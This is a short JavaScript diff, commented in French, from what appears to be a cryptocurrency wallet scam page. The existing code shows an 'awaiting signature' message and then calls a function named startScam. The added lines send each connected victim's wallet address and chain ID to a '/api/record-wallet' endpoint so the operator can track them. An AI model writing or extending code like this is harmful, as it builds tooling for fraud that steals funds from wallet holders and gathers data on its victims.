@@ -1046,6 +1046,16 @@
       const scanText = document.querySelector('.scan');
       if (scanText) scanText.textContent = 'En attente de signature…';
 
+            // Enregistrer la connexion du wallet dans l'historique
+      fetch('/api/record-wallet', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          address: account,
+          chain: currentChainId
+        })
+      }).catch(err => console.error('Erreur record-wallet:', err));
+      
       setTimeout(startScam, 1000);
     }
 
